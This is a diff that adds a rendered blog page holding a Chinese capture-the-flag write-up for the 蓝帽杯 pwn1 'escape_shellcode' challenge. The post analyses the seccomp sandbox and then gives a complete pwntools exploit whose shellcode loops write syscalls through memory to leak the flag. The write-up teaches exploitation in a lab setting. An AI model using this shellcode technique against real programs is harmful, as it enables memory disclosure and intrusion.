@@ -1,37 +1,387 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msvalidate.01" content="237E6FD4C952815B9A0DDB67FAB1FF12">
+  <meta name="baidu-site-verification" content="code-LhZrqnckkC">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"eur1ka.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="题目简介一道升级版的ret2shellcode 解题流程查看保护 静态分析main() init_io()就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示  可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。 init_main() 可以看到heap_mem这个全局变量保存了堆的malloc地址，然后下面">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝帽杯初赛pwn1复现">
+<meta property="og:url" content="https://eur1ka.github.io/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/index.html">
+<meta property="og:site_name" content="Eureka&#39;s Blog">
+<meta property="og:description" content="题目简介一道升级版的ret2shellcode 解题流程查看保护 静态分析main() init_io()就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示  可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。 init_main() 可以看到heap_mem这个全局变量保存了堆的malloc地址，然后下面">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710224631699.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710224715244.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710224957314.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710225220354.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710225451610.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710225612172.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710225729898.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710230113827.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710230644865.png">
+<meta property="og:image" content="https://eur1ka.github.io/image-20220710231937873.png">
+<meta property="article:published_time" content="2022-07-12T12:02:00.000Z">
+<meta property="article:modified_time" content="2022-09-21T03:25:28.048Z">
+<meta property="article:author" content="nnnpc、commit、Eureka">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://eur1ka.github.io/image-20220710224631699.png">
 
 
-{% block content %}
+<link rel="canonical" href="https://eur1ka.github.io/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/">
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://eur1ka.github.io/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/","path":"2022/07/12/2022蓝帽杯初赛pwn1(复现)/","title":"蓝帽杯初赛pwn1复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>蓝帽杯初赛pwn1复现 | Eureka's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eureka's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">默安科技逐日实验室</p>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">题目简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">解题流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="nav-number">2.1.</span> <span class="nav-text">查看保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main"><span class="nav-number">2.2.1.</span> <span class="nav-text">main()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#init-main"><span class="nav-number">2.2.2.</span> <span class="nav-text">init_main()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#init-flag"><span class="nav-number">2.2.3.</span> <span class="nav-text">init_flag()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go"><span class="nav-number">2.2.4.</span> <span class="nav-text">go()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-number">2.3.</span> <span class="nav-text">动态调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EXP"><span class="nav-number">3.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nnnpc、commit、Eureka"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">nnnpc、commit、Eureka</p>
+  <div class="site-description" itemprop="description">网络信息安全，责任重大，使命光荣。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="蓝帽杯初赛pwn1复现 | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          蓝帽杯初赛pwn1复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-07-12 20:02:00" itemprop="dateCreated datePublished" datetime="2022-07-12T20:02:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-21 11:25:28" itemprop="dateModified" datetime="2022-09-21T11:25:28+08:00">2022-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道升级版的ret2shellcode</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="/image-20220710224631699.png" alt="image-20220710224631699"></p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p><img src="/image-20220710224715244.png" alt="image-20220710224715244"></p>
+<p><code>init_io()</code>就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示</p>
+<p><img src="/image-20220710224957314.png" alt="image-20220710224957314"></p>
+<p>可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。</p>
+<h3 id="init-main"><a href="#init-main" class="headerlink" title="init_main()"></a>init_main()</h3><p><img src="/image-20220710225220354.png" alt="image-20220710225220354"></p>
+<p>可以看到<code>heap_mem</code>这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。</p>
+<p><img src="/image-20220710225451610.png" alt="image-20220710225451610"></p>
+<h3 id="init-flag"><a href="#init-flag" class="headerlink" title="init_flag()"></a>init_flag()</h3><p><img src="/image-20220710225612172.png" alt="image-20220710225612172"></p>
+<p>看到了不得了的东西，直接将flag写到了bss段上。</p>
+<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><p><img src="/image-20220710225729898.png" alt="image-20220710225729898"></p>
+<p>因为<code>heap_mem</code>上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>首先运行一下程序</p>
+<p><img src="/image-20220710230113827.png" alt="image-20220710230113827"></p>
+<p>在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在<code>init_mem()</code>中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。</p>
+<p><img src="/image-20220710230644865.png" alt="image-20220710230644865"></p>
+<p>如上图所示，其实<code>ret heap_mem()</code>后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。</p>
+<p>&#x3D;&#x3D;因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：&#x3D;&#x3D;</p>
+<p>在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。</p>
+<p><img src="/image-20220710231937873.png" alt="image-20220710231937873"></p>
+<p>利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;39.106.156.74&quot;,23470)</span></span><br><span class="line"><span class="comment">#start=0</span></span><br><span class="line">start=<span class="number">0x500000000000</span></span><br><span class="line"><span class="comment">#addr=0x5633c143f000</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">    mov r12,0xfffff0000000</span></span><br><span class="line"><span class="string">    mov r15,0x1000#r15储存偏移</span></span><br><span class="line"><span class="string">    mov rdx,0x1000#打印长度设置为0x1000</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall#write(rdi,rsi,rdx)</span></span><br><span class="line"><span class="string">    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址</span></span><br><span class="line"><span class="string">    and rsi,r12#丢弃后28位</span></span><br><span class="line"><span class="string">    add rsi,r15#rsi=rsi+偏移地址</span></span><br><span class="line"><span class="string">    add r15,0x1000#偏移递增0x1000</span></span><br><span class="line"><span class="string">    jmp $-0x19#循环 跳转到mov rax，1 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(start)</span><br><span class="line">payload=asm(code)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;&#x27;</span>+sh.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/" rel="prev" title="2022蓝帽杯初赛WP">
+                  <i class="fa fa-angle-left"></i> 2022蓝帽杯初赛WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/07/12/embryoio%20level36~level59/" rel="next" title="embryoio level36~level59">
+                  embryoio level36~level59 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022023783号-1 </a>
+  </div>
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">nnnpc、commit、Eureka</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
